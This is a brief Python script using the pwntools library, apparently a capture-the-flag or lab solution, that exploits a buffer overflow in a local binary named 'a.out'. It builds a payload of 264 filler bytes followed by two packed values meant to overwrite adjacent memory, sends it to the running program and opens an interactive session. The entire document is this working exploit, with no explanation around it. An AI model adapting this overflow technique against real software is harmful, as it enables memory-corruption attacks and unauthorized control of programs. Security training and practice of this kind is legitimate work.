from pwn import *

elf = load("a.out")

payload = b'A' * 264 + p32(0x1337) + p32(0x69696969)
print(str(payload))

io = process(elf.path)
print(io.recvline())
io.sendline(payload)
io.interactive()
